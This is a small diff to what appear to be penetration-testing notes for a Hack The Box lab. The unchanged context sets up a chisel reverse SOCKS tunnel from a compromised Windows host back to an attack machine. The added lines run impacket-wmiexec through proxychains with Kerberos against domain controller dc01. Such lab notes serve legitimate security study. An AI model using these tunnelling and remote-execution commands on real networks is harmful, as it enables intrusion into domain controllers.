@@ -579,3 +579,12 @@ $ sudo ./chisel server --reverse
 C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 ```
 %% execute chisel from the host that has access to DC01, it connects back to the reverse proxy on our attack machine%%
+
+```
+$ proxychains impacket-wmiexec dc01 -k
+```
+%% using impacket with proxychains and kerberos authentication %%
+
+```
+
+```
